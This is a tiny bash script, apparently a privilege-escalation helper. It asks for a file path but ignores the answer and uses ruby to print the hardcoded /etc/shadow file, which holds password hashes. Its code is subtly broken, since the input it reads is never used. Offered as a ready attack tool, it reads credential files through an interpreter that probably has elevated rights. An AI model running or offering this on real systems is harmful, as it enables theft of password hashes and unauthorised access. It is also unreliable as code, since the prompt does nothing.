#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
echo "To view other file change the /etc/shadow postion to your file path."
ruby -e 'puts File.read("/etc/shadow")'
